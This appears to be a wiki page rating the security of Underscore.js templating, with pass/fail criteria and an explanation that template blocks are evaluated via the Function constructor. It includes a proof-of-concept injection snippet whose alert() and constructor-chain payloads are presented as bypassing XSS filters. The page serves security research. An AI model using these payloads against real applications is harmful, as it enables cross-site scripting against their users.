

# Introduction #

"Underscore is a utility-belt library for JavaScript that provides a lot of the functional programming support that you would expect in Prototype.js (or Ruby), but without extending any of the built-in JavaScript objects. It's the tie to go along with jQuery's tux, and Backbone.js's suspenders.

Underscore provides 80-odd functions that support both the usual functional suspects: map, select, invoke — as well as more specialized helpers: function binding, javascript templating, deep equality testing, and so on. It delegates to built-in functions, if present, so modern browsers will use the native implementations of forEach, map, reduce, filter, every, some and indexOf."

From http://underscorejs.org/

# Quick Facts #

  * [Underscore.js 1.5.1 (Uncompressed)](http://underscorejs.org/underscore.js)
  * Usage Stats http://trends.builtwith.com/javascript/Underscore.js

  * **{}SEC-A** <font color='red'><b>FAIL</b></font> Template expressions are equivalent to `eval`
  * **{}SEC-B** <font color='red'><b>FAIL</b></font> No sandbox or isolated execution scope
  * **{}SEC-C** <font color='green'><b>PASS</b></font> Only `SCRIPT` elements with proper type can serve as template containers
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, no obvious way to outsource templates to static files
  * **{}SEC-E** <font color='red'><b>FAIL</b></font> No dedicated security response program, no security@underscorejs.org address

# Injection Attacks #

Underscore.js, similar to CanJS, uses ERB-style templates by default. Everything that is placed in-between the <% and %> or its siblings is being treated as raw JavaScript. The evaluation of the template strings happens via the usual `Function` constructor.

Whenever the developer has control over content of the ERB-style template blocks, script injections and XSS are very much likely. The "paste-and-go" code example below shows several cases an attacker can use to bypass server- and browser side XSS filters in case the attacked Underscore.js application allows injections.

```
<script type='text/javascript' src='http://code.jquery.com/jquery-git.js'></script>
<script type='text/javascript' src="http://documentcloud.github.com/underscore/underscore-min.js"></script>

<script type='text/javascript'>
$(window).load(function(){
	
_.template($(x).html(), {});
_.template('<% alert(3) %>', {});
	
});
</script>

<script type="text/html" id='x'>
    <% alert(1) %>
    <%= _.constructor.constructor("alert(2)")() %>
</script>
```

## Eval via Function ##

```
j.template = function(n, t, r) {
        var e;
        r = j.defaults({}, r, j.templateSettings);
        var u = new RegExp([(r.escape || q).source, (r.interpolate || q).source, (r.evaluate || q).source].join("|") + "|$", "g"), i = 0, a = "__p+='";
        n.replace(u, function(t, r, e, u, o) {
            return a += n.slice(i, o).replace(z, function(n) {
                return "\\" + B[n]
            }), r && (a += "'+\n((__t=(" + r + "))==null?'':_.escape(__t))+\n'"), e && (a += "'+\n((__t=(" + e + "))==null?'':__t)+\n'"), u && (a += "';\n" + u + "\n__p+='"), i = o + t.length, t
        }), a += "';\n", r.variable || (a = "with(obj||{}){\n" + a + "}\n"), a = "var __t,__p='',__j=Array.prototype.join," + "print=function(){__p+=__j.call(arguments,'');};\n" + a + "return __p;\n";
        try {
            e = new Function(r.variable || "obj", "_", a)
        } catch (o) {
            throw o.source = a, o
        }
        if (t)
            return e(t, j);
        var c = function(n) {
            return e.call(this, n, j)
        };
        return c.source = "function(" + (r.variable || "obj") + "){\n" + a + "}", c
    }
```